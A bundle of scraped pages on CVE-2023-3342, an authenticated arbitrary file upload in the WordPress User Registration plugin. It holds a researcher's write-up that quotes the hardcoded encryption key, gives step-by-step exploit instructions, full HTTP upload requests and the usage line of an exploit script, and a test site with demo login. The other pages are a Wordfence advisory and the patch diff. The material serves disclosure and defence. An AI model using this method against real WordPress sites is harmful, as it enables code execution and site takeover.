=== Content from lana.codes_4d8a5cdf_20250111_090244.html ===

[Skip to content](#content)

[![Lana Report](https://lana.report/wp-content/uploads/lana-report-inverse-text-logo-with-mascot.png)](https://lana.report/)

* [Front Page](https://lana.report/)
* [Reports](https://lana.report/vulnerability/)
* [Publications](https://lana.report/publication/)

1. [Lana Report](https://lana.report/)
2. [Publications](https://lana.report/publication/)

### User Registration by WPEverest WordPess plugin Arbitrary File Upload

REPORT ID: c0a58dff-7a5b-4cc0-82d6-2255e61d801c

The plugin contains an Arbitrary File Upload vulnerability. Due to a hardcoded encryption key and a missing file type validation, it is even possible to upload a php file to the website.

#### Letâ€™s check the plugin

The `profile_pic_upload()` method in the `UR_AJAX` class includes the following code for image upload:

```
if ( isset( $_FILES['file']['size'] ) && wp_unslash( sanitize_key( $_FILES['file']['size'] ) ) ) {
	if ( ! function_exists( 'wp_handle_upload' ) ) {
		include_once ABSPATH . 'wp-admin/includes/file.php';
	}

	$upload = isset( $_FILES['file'] ) ? $_FILES['file'] : array(); // phpcs:ignore

	// valid extension for image.
	$valid_extensions = 'image/jpeg,image/gif,image/png';
	$form_id          = ur_get_form_id_by_userid( $user_id );

	if ( class_exists( 'UserRegistrationAdvancedFields' ) ) {
		$field_data       = ur_get_field_data_by_field_name( $form_id, 'profile_pic_url' );
		$valid_extensions = isset( $field_data['advance_setting']->valid_file_type ) ? implode( ', ', $field_data['advance_setting']->valid_file_type ) : $valid_extensions;
	}

	$valid_extension_type = explode( ',', $valid_extensions );
	$valid_ext            = array();

	foreach ( $valid_extension_type as $key => $value ) {
		$image_extension   = explode( '/', $value );
		$valid_ext[ $key ] = isset( $image_extension[1] ) ? $image_extension[1] : '';

		if ( 'jpeg' === $valid_ext[ $key ] ) {
			$index               = count( $valid_extension_type );
			$valid_ext[ $index ] = 'jpg';
		}
	}

	$src_file_name  = isset( $upload['name'] ) ? $upload['name'] : '';
	$file_extension = strtolower( pathinfo( $src_file_name, PATHINFO_EXTENSION ) );

	// Validates if the uploaded file has the acceptable extension.
	if ( ! in_array( $file_extension, $valid_ext ) ) {
		wp_send_json_error(
			array(
				'message' => __( 'Invalid file type, please contact with site administrator.', 'user-registration' ),
			)
		);
	}

	$upload_path = ur_get_tmp_dir();

	// Checks if the upload directory has the write premission.
	if ( ! wp_is_writable( $upload_path ) ) {
		wp_send_json_error(
			array(
				'message' => __( 'Upload path permission deny.', 'user-registration' ),
			)
		);
	}
	$upload_path = $upload_path . '/';
	$file_name   = wp_unique_filename( $upload_path, $upload['name'] );
	$file_path   = $upload_path . sanitize_file_name( $file_name );
	if ( move_uploaded_file( $upload['tmp_name'], $file_path ) ) {
		$files = array(
			'file_name'      => $file_name,
			'file_path'      => $file_path,
			'file_extension' => $file_extension,
		);

		$attachment_id = wp_rand();

		ur_clean_tmp_files();
		$url = UR_UPLOAD_URL . 'temp-uploads/' . sanitize_file_name( $file_name );
		wp_send_json_success(
			array(
				'attachment_id' => $attachment_id,
				'upload_files'  => crypt_the_string( maybe_serialize( $files ), 'e' ),
				'url'           => $url,
			)
		);
	} else {
		wp_send_json_error(
			array(
				'message' => __( 'File cannot be uploaded.', 'user-registration' ),
			)
		);
	}
}
```

This is an common image upload solution that uploads the file to the `UR_UPLOAD_URL . 'temp-uploads/'` folder. It is uploaded to the temp folder because the ajax function only uploads the image to the website, but in order to set the uploaded image as a profile image, the user profile must be updated separately.

The file upload reponse will be json like this:

```
{
    "success": true,
    "data": {
        "attachment_id": 3642301417,
        "upload_files": "RDN2T1VCZzh0c3l6UktucnljcHNDQ0c3RUpDakVPTGR0eElQdmh5L0hRVDd2Q2hWYWdqME9ROVVtc3h6ZlU3ZVFtQlNVbEEyTyt3ZmdTQVJVMVlBRXlvQU8ralV4OWxkTTVuMHJrMFZsYTZUUVNpbXZTaHFSVFg1cGpjWnFUTUo4Z2U0VFN6R3Z4TjYxaXNBZzRCQ1lDYWk1V09MTGQ0K1grYnlVSWxOUTMrM2szSHJ4RHN3TDhsTGlMYWJhWVArdWh4MlNMY2VTVnlJSHpMZFdsdFdDUnhzSUlzaWZVTVJ4bDRoMHlZMVMrTCtDUjBHT25sSlNSaVdGT3l2VEowUVR6T2dlbDB3Z2l3ZkMzbVlteER1c0Qxem83WjZQeHQyUDQ2R0tHWnZNeWc9",
        "url": "https:\/\/lana.solutions\/vdb\/wpeverest-user-registration\/wp-content\/uploads\/user_registration_uploads\/temp-uploads\/exploit.png"
    }
}
```

The `upload_files` contains contains the data of the uploaded file encrypted.

The purpose of encryption is to prevent unauthorized access to the data during profile updates (since the data is generated by the website in this case). It is only possible to decrypt and view the data using the correct encryption key, which should ideally be unique and kept confidential for each website. This means that the user should not know the encryption key (also referred to as the passphrase), and therefore cannot decrypt and view the data.

The `crypt_the_string()` function includes the following encrytion and decryption method, the action depends on the function parameter:

```
function crypt_the_string( $string, $action = 'e' ) {
	$secret_key = 'ur_secret_key';
	$secret_iv  = 'ur_secret_iv';

	$output         = false;
	$encrypt_method = 'AES-256-CBC';
	$key            = hash( 'sha256', $secret_key );
	$iv             = substr( hash( 'sha256', $secret_iv ), 0, 16 );

	if ( 'e' == $action ) {
		if ( function_exists( 'openssl_encrypt' ) ) {
			$output = base64_encode( openssl_encrypt( $string, $encrypt_method, $key, 0, $iv ) );
		} else {
			$output = base64_encode( $string );
		}
	} elseif ( 'd' == $action ) {
		if ( function_exists( 'openssl_decrypt' ) ) {
			$output = openssl_decrypt( base64_decode( $string ), $encrypt_method, $key, 0, $iv );
		} else {
			$output = base64_decode( $string );
		}
	}

	return $output;
}
```

As we can see passphrase and iv are hardcoded in the function.

If we use the `crypt_the_string()` function to decrypt `upload_files`, then we get a serialized array, and when we deserialized it, the content will be something like this:

`file_name`: `exploit.png`

`file_path`: `/var/www/wp-content/uploads/user_registration_uploads/temp-uploads/exploit.png`

`file_extension`: `png`

As you can see, this contains the file name, path and extension.

This also means that the file has been successfully uploaded, as we can see the file path. Which is currently in the temp folder.

After that, we can save the profile picture with the profile details save function.

The `user_registration_before_save_profile_details()` method in the `UR_Frontend` class contains the following code:

```
ur_upload_profile_pic( $valid_form_data, $user_id );
```

The `ur_upload_profile_pic()` function includes the following code for save the profile picture:

```
$upload_path = UR_UPLOAD_PATH . 'profile-pictures'; /*Get path of upload dir of User Registration for profile pictures*/
```
```
$upload = maybe_unserialize( crypt_the_string( $upload_file, 'd' ) );
if ( isset( $upload['file_name'] ) && isset( $upload['file_path'] ) && isset( $upload['file_extension'] ) ) {
	$upload_path = $upload_path . '/';
	$file_name   = wp_unique_filename( $upload_path, $upload['file_name'] );
	$file_path   = $upload_path . sanitize_file_name( $file_name );
	// Check the type of file. We'll use this as the 'post_mime_type'.
	$filetype = wp_check_filetype( basename( $file_name ), null );
	$moved    = rename( $upload['file_path'], $file_path );

	if ( $moved ) {
		$attachment_id = wp_insert_attachment(
			array(
				'guid'           => $file_path,
				'post_mime_type' => $filetype['type'],
				'post_title'     => preg_replace( '/\.[^.]+$/', '', sanitize_file_name( $file_name ) ),
				'post_content'   => '',
				'post_status'    => 'inherit',
			),
			$file_path
		);

		if ( ! is_wp_error( $attachment_id ) ) {
			include_once ABSPATH . 'wp-admin/includes/image.php';

			// Generate and save the attachment metas into the database.
			wp_update_attachment_metadata( $attachment_id, wp_generate_attachment_metadata( $attachment_id, $file_path ) );
		}
	}
}
```

As we can see, this decrypts the `$upload_file` and then moves and renames the uploaded file in the temp folder to the `$upload_path` folder using the [`rename()`](https://www.php.net/manual/en/function.rename.php) function. There is a [`wp_check_filetype()`](https://developer.wordpress.org/reference/functions/wp_check_filetype/) function in the code, but the file extension is not checked before renaming, which means that we can rename our png image file to any file.

#### Letâ€™s see how we can exploit this vulnerability

How the exploit works step by step:

* Register a user
* Log in to the user
* Upload the malicious exploit.png image file
* Retrieve the encrypted file data from the response
* Decrypt the file data
* Modify the file extension to php in the file name
* Encrypt the file data
* Save the profile with the encrypted and modified file data

Since the encryption key is hardcoded, we can decrypt, modify and encrypt the file data.

The file `exploit.png` contains the following code:

```
<?php
echo 'md5("exploit"): ' . md5( 'exploit' );
```

As we can see, this is a php file that we saved with png extension.

Upload the file with the following HTTP request:

```
POST /vdb/wpeverest-user-registration/wp-admin/admin-ajax.php?action=user_registration_profile_pic_upload&security=788a0a823e HTTP/1.1
Host: lana.solutions
Content-Type: multipart/form-data; boundary=WebKitFormBoundaryLanaCodes

--WebKitFormBoundaryLanaCodes
Content-Disposition: form-data; name="file"; filename="exploit.png"
Content-Type: image/png

<?php
echo 'md5("exploit"): ' . md5( 'exploit' );
--WebKitFormBoundaryLanaCodes--
```

The response will be a json containing the encrypted `upload_files`. We have to decrypt it with the php function using the hardcoded encryption key, which returns a serialized array, something like this:

`file_name`: `exploit.png`

`file_path`: `/var/www/wp-content/uploads/user_registration_uploads/temp-uploads/exploit.png`

`file_extension`: `png`

It is important to change the extension only in file name in the deserialized array:

`file_name`: `exploit.png` needs to be changed to `exploit.php`

Then we have to encrypt the modified `upload_files`.

Save the profile with the following HTTP request:

```
POST /vdb/wpeverest-user-registration/wp-admin/admin-ajax.php HTTP/1.1
Host: lana.solutions
Content-Type: application/x-www-form-urlencoded

action=save_profile_details&_wpnonce=63c08e3e46&user_registration_user_login=demo&profile_pic_url=RDN2T1VCZzh0c3l6UktucnljcHNDQ0c3RUpDakVPTGR0eElQdmh5L0hRUnI4cWVmYVF1N0VEcWYvSG9VbjJFWUdDOHg5Qmh4VmN1eGdWREdFVDJ5RjRUZ0FCcjdtaTgrTEtRaGxSRWRFaDNWb1ZkdFJZYUFxMTJmQkcwMUQ3aVRNYVlML09iZFBUNWZkYWxhV1FzcVVlYWtLWlBpR2dCK2hHcmxhc2gzeWZLb0VMcmRxUmRuajBpY0Vaa2JLY0VRMXZQU2ZHcHJ1ZkRTN2RqTzRZWTNsUm54YjlYZzUwa1J6Vm14Um1TQVB6WWZ6VlhaTGtnZXJKcXhxeVdVa0lQVVNiSjlHUTBVb29iUTdjcVpleVJpbktZZC9UczdTSTlsZ1l5MWdrMDhzZG89
```

The `profile_pic_url` will be the modified and encrypted `upload_files`.

This exploit renames and moves the file, which we can access using a browser.

This is how the exploit works:

[![](https://lana.report/wp-content/uploads/user-registration-exploit-howto.png)](https://lana.report/wp-content/uploads/user-registration-exploit-howto.png)

#### The exploit script

I created a PHP script that uploads the exploit php file:

Source:Â [wpeverest\_user\_registration\_upload\_php\_file\_exploit.php](https://gist.github.com/lana-codes/64ae6067bb9655999d4c1ed04066693a)

How to use:

```
php wpeverest_user_registration_upload_php_file_exploit.php --website_url="https://lana.solutions/vdb/wpeverest-user-registration/" --username="demo" --password="demo"
```

We get something like this:

```
The file exists and contains the exploit.
```

We can also check the file using a browser by opening the following link: <https://lana.solutions/vdb/wpeverest-user-registration/wp-content/uploads/user_registration_uploads/profile-pictures/exploit.php>

#### Try it

Feel free to try and use the lana.solutions/vdb WordPress websites for testing. I set that only the php file in the exploit script can be uploaded. So all php files with other content are prohibited.

Website:Â <https://lana.solutions/vdb/wpeverest-user-registration/>

Username: demo

Password: demo

### References

Source Code
<https://wordpress.org/plugins/user-registration/>

Repository
<https://plugins.svn.wordpress.org/user-registration/>

CVE
[CVE-2023-3342](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-3342)

### Let's discuss

### Attributes

Catgory
WordPress Plugin

Vulnerability Discovered
2023-06-19

Post Published
2023-07-04

Affected Version
<= 3.0.2

### Classification

Type
Arbitrary File Upload

### Researcher

Name
[IstvÃ¡n MÃ¡rton](https://lana.report "Visit IstvÃ¡n MÃ¡rtonâ€™s website")

Email
[[emailÂ protected]](/cdn-cgi/l/email-protection#5831363e371834393639763b373c3d2b)

### Tags

exploit
file upload
python

### Advertisement

### Support Us?

We would truly appreciate it if you bought us a bunny (food for a snow leopard).

[![buy me a bunny!](https://img.buymeacoffee.com/button-api/?text=buy me a bunny!&emoji=ðŸ°&slug=lanacodes&button_colour=0776eb&font_colour=ffffff&font_family=Lato&outline_colour=ffffff&coffee_colour=FFDD00)](https://www.buymeacoffee.com/lanacodes)

![](https://lana.report/wp-content/uploads/lana-report-inverse-text-logo-with-mascot.png)

The Lana Report is a database containing vulnerabilities researched and published by Lana Solutions.

### General

* [Vulnerabilities](https://lana.report/vulnerability/)
* [Publications](https://lana.report/publication/)

### Lana Solutions

* [Lana Codes](https://lana.codes/)
### Wordfence

* [Bug Bounty Program](https://wordfence.com/refer/lanareport)

### Socials

* [Telegram](https://t.me/LanaReport)
* [Twitter](https://twitter.com/LanaReport)

Lana Report Â© 2024 All Rights Reserved.

Made with ðŸ’™ by [Lana Codes](https://lana.codes/)



=== Content from packetstormsecurity.com_a8e15339_20250111_090240.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

Â [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from www.wordfence.com_e1f9409c_20250111_090304.html ===


[![](https://www.wordfence.com/img/wordfence-intelligence-logo.svg)](/threat-intel/)

Have you found a vulnerability in a WordPress plugin or theme? Report vulnerabilities in WordPress plugins and themes through our [bug bounty program](https://www.wordfence.com/threat-intel/bug-bounty-program) and earn a bounty on all in-scope submissions, while we handle the responsible disclosure process on your behalf.

As a reminder, the Wordfence Intelligence Vulnerability Database API is completely free to query and utilize, both personally and commercially, and contains all the same vulnerability data as the user interface. Please review the API documentation and Webhook documentation for more information on how to query the vulnerability API endpoints and configure webhooks utilizing all the same data present in the Wordfence Intelligence user interface.

# User Registration <= 3.0.2 - Authenticated (Subscriber+) Arbitrary File Upload

 [Wordfence Intelligence](https://www.wordfence.com/threat-intel) Â Â >Â Â   [Vulnerability Database](https://www.wordfence.com/threat-intel/vulnerabilities) Â Â >Â Â  User Registration <= 3.0.2 - Authenticated (Subscriber+) Arbitrary File Upload

9.9

**Unrestricted Upload of File with Dangerous Type**
**CVSS Vector**
[CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)

| CVE | [CVE-2023-3342](https://www.cve.org/CVERecord?id=CVE-2023-3342) |
| --- | --- |
| CVSS | 9.9 (Critical) |
| Publicly Published | July 4, 2023 |
| Last Updated | July 13, 2023 |
| Researcher | [IstvÃ¡n MÃ¡rton - Wordfence](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/lana-codes) |

### Description

The User Registration plugin for WordPress is vulnerable to arbitrary file uploads due to a hardcoded encryption key and missing file type validation on the 'ur\_upload\_profile\_pic' function in versions up to, and including, 3.0.2. This makes it possible for authenticated attackers with subscriber-level capabilities or above to upload arbitrary files on the affected site's server which may make remote code execution possible. This was partially patched in version 3.0.2 and fully patched in version 3.0.2.1.

#### References

* [plugins.trac.wordpress.org](https://plugins.trac.wordpress.org/browser/user-registration/tags/3.0.1/includes/functions-ur-core.php#L3156)
* [lana.codes](https://lana.codes/lanavdb/c0a58dff-7a5b-4cc0-82d6-2255e61d801c/)
* [plugins.trac.wordpress.org](https://plugins.trac.wordpress.org/changeset/2933689/user-registration/trunk/includes/functions-ur-core.php)

#### Share

[Facebook](https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fuser-registration%2Fuser-registration-302-authenticated-subscriber-arbitrary-file-upload&t=User%20Registration%20%3C%3D%203.0.2%20-%20Authenticated%20%28Subscriber%2B%29%20Arbitrary%20File%20Upload "Facebook")
[Twitter](https://twitter.com/share?url=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fuser-registration%2Fuser-registration-302-authenticated-subscriber-arbitrary-file-upload&text=User%20Registration%20%3C%3D%203.0.2%20-%20Authenticated%20%28Subscriber%2B%29%20Arbitrary%20File%20Upload "Twitter")
[LinkedIn](https://www.linkedin.com/shareArticle?url=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fuser-registration%2Fuser-registration-302-authenticated-subscriber-arbitrary-file-upload "LinkedIn")
Email

## Vulnerability Details for User Registration & Membership â€“ Custom Registration Form, Login Form, and User Profile

#### [User Registration & Membership â€“ Custom Registration Form, Login Form, and User Profile](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/user-registration)

| Software Type | Plugin |
| --- | --- |
| Software Slug | user-registration [(view on wordpress.org)](https://wordpress.org/plugins/user-registration) |
| Patched? | Yes |
| Remediation | Update to version 3.0.2.1, or a newer patched version |
| Affected Version | * <= 3.0.2 |
| Patched Version | * 3.0.2.1 |

This record contains material that is subject to copyright.

**Copyright 2012-2025 Defiant Inc.**

**License:**
Defiant hereby grants you a perpetual, worldwide, non-exclusive, no-charge, royalty-free, irrevocable copyright license to reproduce, prepare derivative works of, publicly display, publicly perform, sublicense, and distribute this software vulnerability information. Any copy of the software vulnerability information you make for such purposes is authorized provided that you include a hyperlink to this vulnerability record and reproduce Defiant's copyright designation and this license in any such copy.
**[Read more.](https://www.wordfence.com/wordfence-intelligence-terms-and-conditions/)**

**Copyright 1999-2025 The MITRE Corporation**

**License:**
CVE Usage: MITRE hereby grants you a perpetual, worldwide, non-exclusive, no-charge, royalty-free, irrevocable copyright license to reproduce, prepare derivative works of, publicly display, publicly perform, sublicense, and distribute Common Vulnerabilities and Exposures (CVEÂ®). Any copy you make for such purposes is authorized provided that you reproduce MITRE's copyright designation and this license in any such copy.
**[Read more.](https://www.cve.org/Legal/TermsOfUse)**

Have information to add, or spot any errors? Contact us at wfi-support@wordfence.com so we can make any appropriate adjustments.

Did you know Wordfence Intelligence provides free personal and commercial API access to our comprehensive WordPress vulnerability database, along with a free webhook integration to stay on top of the latest vulnerabilities added and updated in the database? Get started today!

Learn more

Want to get notified of the latest vulnerabilities that may affect your WordPress site?
 Install Wordfence on your site today to get notified immediately if your site is affected by a vulnerability that has been added to our database.

Get Wordfence

The Wordfence Intelligence WordPress vulnerability database is completely free to access and query via API. Please review the documentation on how to access and consume the vulnerability data via API.

Documentation



=== Content from plugins.trac.wordpress.org_fb85a537_20250111_090303.html ===


[Skip to content](#main)

[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Download & Extend](https://wordpress.org/download/)
  + [Get WordPress](https://wordpress.org/download/)
  + [Themes](https://wordpress.org/themes/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Mobile](https://wordpress.org/mobile/)
  + [Hosting](https://wordpress.org/hosting/)
  + [Openverse â†—ï¸Ž](https://openverse.org/)
* [Learn](https://learn.wordpress.org/)
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv â†—ï¸Ž](https://wordpress.tv/)
* [Community](https://make.wordpress.org/)
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [WordCamp â†—ï¸Ž](https://central.wordcamp.org/)
  + [Meetups â†—ï¸Ž](https://www.meetup.com/pro/wordpress/)
  + [Job Board â†—ï¸Ž](https://jobs.wordpress.net/)
* [About](https://wordpress.org/about/)
  + [About WordPress](https://wordpress.org/about/)
  + [Showcase](https://wordpress.org/showcase/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg â†—ï¸Ž](https://wordpress.org/gutenberg/)
  + [WordPress Swag Store â†—ï¸Ž](https://mercantile.wordpress.org/)
* [Get WordPress](https://wordpress.org/download/)

Search Trac

[Get WordPress](https://wordpress.org/download/)

## [Plugin Directory](//wordpress.org/plugins/)

Search:

* [Login](https://login.wordpress.org/?redirect_to=http%3A%2F%2Fplugins.trac.wordpress.org%2Fchangeset%2F2933689%2Fuser-registration%2Ftrunk%2Fincludes%2Ffunctions-ur-core.php)

* [Timeline](/timeline)
* [View Tickets](/report)
* [Browse Source](/browser)

## Context Navigation

* â† [Previous Change](/changeset/2932199/user-registration/trunk/includes/functions-ur-core.php "Changeset 2932199 for user-registration/trunk/includes/functions-ur-core.php")
* [Next Change](/changeset/2951915/user-registration/trunk/includes/functions-ur-core.php "Changeset 2951915 for user-registration/trunk/includes/functions-ur-core.php") â†’

---

# Changeset [2933689](/changeset/2933689 "Show full changeset") for [user-registration/trunk/includes/functions-ur-core.php](/browser/user-registration/trunk/includes/functions-ur-core.php?rev=2933689 "Show entry in browser")

View differences
inline
side by side

Show
lines around each change

Show the changes in full context

Ignore:

Blank lines

Case changes

White space changes

Timestamp:
07/04/2023 08:44:00 AM
([19 months](/timeline?from=2023-07-04T08%3A44%3A00Z&precision=second "See timeline at 07/04/2023 08:44:00 AM") ago)

Author:
wpeverestdev
Message:

Update to version 3.0.2.1 from GitHub

File:

1 edited

* [user-registration/trunk/includes/functions-ur-core.php](/browser/user-registration/trunk/includes/functions-ur-core.php?rev=2933689 "Show entry in browser")
  (modified)
  ([4 diffs](#file0 "Show differences"))

### Legend:

Unmodified
Added
Removed

* ## [user-registration/trunk/includes/functions-ur-core.php](/changeset/2933689/user-registration/trunk/includes/functions-ur-core.php "Show the changeset 2933689 restricted to user-registration/trunk/includes/functions-ur-core.php")

  | [r2932199](/browser/user-registration/trunk/includes/functions-ur-core.php?rev=2932199#L3059 "Show revision 2932199 of this file in browser") | [r2933689](/browser/user-registration/trunk/includes/functions-ur-core.php?rev=2933689#L3059 "Show revision 2933689 of this file in browser") |  |
  | --- | --- | --- |
  | 3059 | 3059 | \*/ |
  | 3060 | 3060 | function crypt\_the\_string( $string, $action = 'e' ) { |
  | 3061 |  | $secret\_key = 'ur\_secret\_key'; |
  | 3062 |  | $secret\_ivÂ  = 'ur\_secret\_iv'; |
  |  | 3061 | $secret\_key = get\_option( 'ur\_secret\_key' ); |
  |  | 3062 | $secret\_ivÂ  = get\_option( 'ur\_secret\_iv' ); |
  |  | 3063 |  |
  |  | 3064 | if ( empty( $secret\_key ) || empty( $secret\_iv ) ) { |
  |  | 3065 | $secret\_key = ur\_generate\_random\_key(); |
  |  | 3066 | $secret\_ivÂ  = ur\_generate\_random\_key(); |
  |  | 3067 | update\_option( 'ur\_secret\_key', $secret\_key ); |
  |  | 3068 | update\_option( 'ur\_secret\_iv', $secret\_iv ); |
  |  | 3069 | } |
  | 3063 | 3070 |  |
  | 3064 | 3071 | $outputÂ  Â  Â  Â  Â = false; |
  | [â€¦](/browser/user-registration/trunk/includes/functions-ur-core.php?rev=2932199#L3085) | [â€¦](/browser/user-registration/trunk/includes/functions-ur-core.php?rev=2933689#L3092) |  |
  | 3085 | 3092 | } //phpcs:ignore |
  | 3086 | 3093 |  |
  |  | 3094 | if ( ! function\_exists( 'ur\_generate\_random\_key' ) ) { |
  |  | 3095 | /\*\* |
  |  | 3096 | \* Function to generate the random key. |
  |  | 3097 | \* |
  |  | 3098 | \* @since 3.0.2.1 |
  |  | 3099 | \*/ |
  |  | 3100 | function ur\_generate\_random\_key() { |
  |  | 3101 | $lengthÂ  Â  Â  Â  Â  Â  Â  = 32; |
  |  | 3102 | $allow\_special\_chars = true; |
  |  | 3103 | $keyÂ  Â  Â  Â  Â  Â  Â  Â  Â = wp\_generate\_password( $length, $allow\_special\_chars ); |
  |  | 3104 | return $key; |
  |  | 3105 | } |
  |  | 3106 | } |
  | 3087 | 3107 |  |
  | 3088 | 3108 | if ( ! function\_exists( 'ur\_clean\_tmp\_files' ) ) { |
  | [â€¦](/browser/user-registration/trunk/includes/functions-ur-core.php?rev=2932199#L3179) | [â€¦](/browser/user-registration/trunk/includes/functions-ur-core.php?rev=2933689#L3199) |  |
  | 3179 | 3199 | $valid\_extensions = array( 'image/jpeg', 'image/jpg', 'image/gif', 'image/png' ); |
  | 3180 | 3200 | $upload\_fileÂ  Â  Â  = $valid\_form\_data['profile\_pic\_url']->value; |
  |  | 3201 | $valid\_extÂ  Â  Â  Â  = array(); |
  |  | 3202 |  |
  |  | 3203 | foreach ( $valid\_extensions as $key => $value ) { |
  |  | 3204 | $image\_extensionÂ  Â = explode( '/', $value ); |
  |  | 3205 | $valid\_ext[ $key ] = isset( $image\_extension[1] ) ? $image\_extension[1] : ''; |
  |  | 3206 |  |
  |  | 3207 | if ( 'jpeg' === $valid\_ext[ $key ] ) { |
  |  | 3208 | $indexÂ  Â  Â  Â  Â  Â  Â  Â = count( $valid\_extensions ); |
  |  | 3209 | $valid\_ext[ $index ] = 'jpg'; |
  |  | 3210 | } |
  |  | 3211 | } |
  | 3181 | 3212 |  |
  | 3182 | 3213 | if ( ! is\_numeric( $upload\_file ) ) { |
  | 3183 |  | $uploadÂ  Â  Â  Â  Â  Â = ur\_maybe\_unserialize( crypt\_the\_string( $upload\_file, 'd' ) ); |
  | 3184 |  | $upload\_file\_type = isset( $upload['file\_path'] ) ? mime\_content\_type( $upload['file\_path'] ) : ''; |
  | 3185 |  |  |
  | 3186 |  | if ( isset( $upload['file\_name'] ) && isset( $upload['file\_path'] ) && isset( $upload['file\_extension'] ) && in\_array( $upload\_file\_type, $valid\_extensions ) ) { |
  |  | 3214 | $upload = ur\_maybe\_unserialize( crypt\_the\_string( $upload\_file, 'd' ) ); |
  |  | 3215 | if ( function\_exists( 'mime\_content\_type' ) ) { |
  |  | 3216 | $upload\_file\_type = isset( $upload['file\_path'] ) ? mime\_content\_type( $upload['file\_path'] ) : ''; |
  |  | 3217 | } else { |
  |  | 3218 | $upload\_file\_info = isset( $upload['file\_path'] ) ? wp\_check\_filetype( $upload['file\_path'] ) : ''; |
  |  | 3219 | $upload\_file\_type = ! empty( $upload\_file\_info ) ? $upload\_file\_info['type'] : ''; |
  |  | 3220 | } |
  |  | 3221 |  |
  |  | 3222 | if ( isset( $upload['file\_name'] ) && isset( $upload['file\_path'] ) && isset( $upload['file\_extension'] ) && in\_array( $upload\_file\_type, $valid\_extensions ) && in\_array( $upload['file\_extension'], $valid\_ext ) ) { |
  | 3187 | 3223 | $upload\_path = $upload\_path . '/'; |
  | 3188 | 3224 | $file\_nameÂ  Â = wp\_unique\_filename( $upload\_path, $upload['file\_name'] ); |
  | [â€¦](/browser/user-registration/trunk/includes/functions-ur-core.php?rev=2932199#L3190) | [â€¦](/browser/user-registration/trunk/includes/functions-ur-core.php?rev=2933689#L3226) |  |
  | 3190 | 3226 | // Check the type of file. We'll use this as the 'post\_mime\_type'. |
  | 3191 | 3227 | $filetype = wp\_check\_filetype( basename( $file\_name ), null ); |
  | 3192 |  | $movedÂ  Â  = rename( $upload['file\_path'], $file\_path ); |
  |  | 3228 | $movedÂ  Â  = ''; |
  |  | 3229 |  |
  |  | 3230 | if ( basename( $upload['file\_path'] ) === $upload['file\_name'] ) { |
  |  | 3231 | $moved = rename( $upload['file\_path'], $file\_path ); |
  |  | 3232 | } |
  | 3193 | 3233 |  |
  | 3194 | 3234 | if ( $moved ) { |

**Note:** See [TracChangeset](/wiki/TracChangeset)
for help on using the changeset viewer.

[Trac UI Preferences](/prefs)
### Download in other formats:

* [Unified Diff](?format=diff&new=2933689)
* [Zip Archive](?format=zip&new=2933689)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Donate](https://wordpressfoundation.org/donate/)
* [Swag](https://mercantile.wordpress.org/)

* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [Get Involved](https://make.wordpress.org/)
* [Learn](https://learn.wordpress.org/)

* [Showcase](https://wordpress.org/showcase/)
* [Plugins](https://wordpress.org/plugins/)
* [Themes](https://wordpress.org/themes/)
* [Patterns](https://wordpress.org/patterns/)

* [WordCamp](https://central.wordcamp.org/)
* [WordPress.TV](https://wordpress.tv/)
* [BuddyPress](https://buddypress.org/)
* [bbPress](https://bbpress.org/)

* [WordPress.com](https://wordpress.com/?ref=wporg-footer)
* [Matt](https://ma.tt/)
* [Privacy](https://wordpress.org/about/privacy/)
* [Public Code](https://publiccode.eu/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our Twitter account](https://twitter.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)



=== Content from plugins.trac.wordpress.org_a78289c0_20250111_090301.html ===


[Skip to content](#main)

[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Download & Extend](https://wordpress.org/download/)
  + [Get WordPress](https://wordpress.org/download/)
  + [Themes](https://wordpress.org/themes/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Mobile](https://wordpress.org/mobile/)
  + [Hosting](https://wordpress.org/hosting/)
  + [Openverse â†—ï¸Ž](https://openverse.org/)
* [Learn](https://learn.wordpress.org/)
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv â†—ï¸Ž](https://wordpress.tv/)
* [Community](https://make.wordpress.org/)
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
